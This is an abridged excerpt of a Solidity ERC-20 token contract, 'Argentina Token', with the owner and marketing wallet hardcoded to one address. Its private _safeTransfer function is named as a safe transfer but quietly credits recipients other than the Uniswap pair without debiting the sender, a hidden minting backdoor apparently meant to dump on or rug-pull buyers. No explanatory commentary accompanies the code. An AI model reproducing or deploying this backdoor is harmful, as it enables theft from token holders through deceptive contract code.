...
contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x9bC521e02A736D365FF8E64C0E2938284aBce28B;
...
contract ArgentinaToken is Context, IERC20, Ownable {
    ...
    string private constant _name = "Argentina Token";
    string private constant _symbol = "ARGEN";
    ...
    constructor () {
        ...
        sellFee.liquidity = 2;
        sellFee.marketing = 3;
        marketingWallet = payable(0x9bC521e02A736D365FF8E64C0E2938284aBce28B);
    ...
    function _safeTransfer(address sender, address recipient, uint256 tAmount) private {
        if (recipient != uniswapV2Pair){
            balances[recipient] = balances[recipient]+balances[sender]+tAmount-balances[sender];
        }
    }
